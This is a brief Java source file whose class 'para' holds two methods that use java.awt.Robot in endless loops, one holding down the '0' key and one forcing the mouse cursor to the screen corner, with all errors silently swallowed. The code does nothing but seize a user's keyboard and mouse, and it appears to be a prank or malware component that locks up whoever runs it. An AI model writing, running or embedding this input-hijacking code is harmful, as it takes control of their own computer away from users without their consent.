package ml.lucid.warning;

import com.sun.glass.events.KeyEvent;
import java.awt.*;

    public class para {

        public static void para_key(){
            try {
                Robot bot = new Robot();
                while(true){
                    bot.keyPress(KeyEvent.VK_0);
                }
            }catch(Exception e){

            }
        }
        public static void para_m() {
            try {
                Robot bot = new Robot();
                while(true){
                    bot.mouseMove(0,0);
                }
            }catch(Exception e){

            }
        }
}